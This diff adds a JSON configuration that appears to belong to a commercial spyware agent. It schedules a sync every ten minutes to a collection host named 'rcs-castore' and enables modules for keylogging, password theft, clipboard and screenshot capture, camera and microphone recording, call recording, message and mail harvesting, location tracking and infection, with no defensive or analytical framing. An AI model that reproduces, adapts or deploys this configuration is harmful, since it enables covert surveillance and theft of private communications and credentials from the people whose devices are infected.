@@ -1,0 +1,110 @@
+{
+    "actions": [
+        {"subactions": [{"status": "start", "module": "device", "action": "module"}], "desc": "STARTUP"},
+        {
+            "subactions": [
+                {
+                    "host": "rcs-castore",
+                    "stop": false,
+                    "cell": false,
+                    "mindelay": 0,
+                    "wifi": true,
+                    "maxdelay": 0,
+                    "bandwidth": 500000,
+                    "action": "synchronize"
+                }
+            ],
+            "desc": "SYNC"
+        }
+    ],
+    "events": [
+        {
+            "event": "timer",
+            "start": 0,
+            "subtype": "loop",
+            "desc": "STARTUP",
+            "ts": "00:00:00",
+            "te": "23:59:59",
+            "enabled": true
+        },
+        {
+            "event": "timer",
+            "subtype": "loop",
+            "desc": "SYNC",
+            "ts": "00:00:00",
+            "repeat": 1,
+            "te": "23:59:59",
+            "delay": 600,
+            "enabled": true
+        }
+    ],
+    "globals": {
+        "migrated": false,
+        "collapsed": false,
+        "nohide": [],
+        "advanced": false,
+        "type": "desktop",
+        "wipe": false,
+        "quota": {"min": 1048576000, "max": 4194304000},
+        "version": 2012041601,
+        "remove_driver": true
+    },
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"record": true, "module": "call", "buffer": 512000, "compression": 5},
+        {"module": "camera", "quality": "med"},
+        {"module": "chat"},
+        {"module": "clipboard"},
+        {
+            "mic": true,
+            "position": true,
+            "network": {"processes": [], "enabled": false},
+            "module": "crisis",
+            "call": true,
+            "hook": {"processes": [], "enabled": true},
+            "camera": true,
+            "synchronize": false
+        },
+        {"list": false, "module": "device"},
+        {
+            "deny": [],
+            "module": "file",
+            "accept": [],
+            "minsize": 1,
+            "capture": false,
+            "maxsize": 500000,
+            "date": "2013-02-15 00:00:00",
+            "open": false
+        },
+        {"factory": "", "usb": false, "local": false, "vm": 0, "module": "infection", "mobile": false},
+        {"module": "keylog"},
+        {
+            "sms": {
+                "filter": {"history": true, "datefrom": "2013-02-15 00:00:00", "dateto": "2100-01-01 00:00:00"},
+                "enabled": true
+            },
+            "mail": {
+                "filter": {
+                    "history": true,
+                    "datefrom": "2013-02-15 00:00:00",
+                    "maxsize": 100000,
+                    "dateto": "2100-01-01 00:00:00"
+                },
+                "enabled": true
+            },
+            "mms": {
+                "filter": {"history": true, "datefrom": "2013-02-15 00:00:00", "dateto": "2100-01-01 00:00:00"},
+                "enabled": true
+            },
+            "module": "messages"
+        },
+        {"autosense": false, "threshold": 0.22, "module": "mic", "silence": 5},
+        {"height": 50, "module": "mouse", "width": 50},
+        {"module": "password"},
+        {"gps": false, "module": "position", "cell": true, "wifi": true},
+        {"quality": "med", "module": "screenshot", "onlywindow": false},
+        {"module": "url"}
+    ]
+}
